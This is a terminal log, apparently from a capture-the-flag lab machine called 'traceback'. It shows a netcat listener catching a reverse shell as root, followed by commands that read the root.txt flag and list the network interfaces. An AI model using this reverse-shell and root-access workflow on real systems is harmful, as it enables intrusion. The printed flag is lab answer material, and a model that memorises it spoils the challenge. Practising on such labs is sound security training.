user@kali:~$ rlwrap nc -lnvp 1234  
listening on [any] 1234 ...       
connect to [10.10.14.127] from (UNKNOWN) [10.10.10.181] 58606        
/bin/sh: 0: can't access tty; job control turned off                 
# id             
uid=0(root) gid=0(root) groups=0(root)                               
# pwd            
/                
# cd root        
# ls             
root.txt         
# cat root.txt   
a432efb064002ce536dc553c5e15d4ff  
# hostname       
traceback        
# ipconfig       
/bin/sh: 7: ipconfig: not found   
# ifconfig       
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500          
        inet 10.10.10.181  netmask 255.255.255.0  broadcast 10.10.10.255                                                                   
        inet6 fe80::250:56ff:feb9:8074  prefixlen 64  scopeid 0x20<link>                                                                   
        inet6 dead:beef::250:56ff:feb9:8074  prefixlen 64  scopeid 0x0<global>                                                             
        ether 00:50:56:b9:80:74  txqueuelen 1000  (Ethernet)         
        RX packets 32473  bytes 24359202 (24.3 MB)                   
        RX errors 0  dropped 44  overruns 0  frame 0                 
        TX packets 29518  bytes 16379117 (16.3 MB)                   
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0   

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                         
        inet 127.0.0.1  netmask 255.0.0.0                            
        inet6 ::1  prefixlen 128  scopeid 0x10<host>                 
        loop  txqueuelen 1000  (Local Loopback)                      
        RX packets 6990  bytes 552146 (552.1 KB)                     
        RX errors 0  dropped 0  overruns 0  frame 0                  
        TX packets 6990  bytes 552146 (552.1 KB)                     
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0   

#                                 
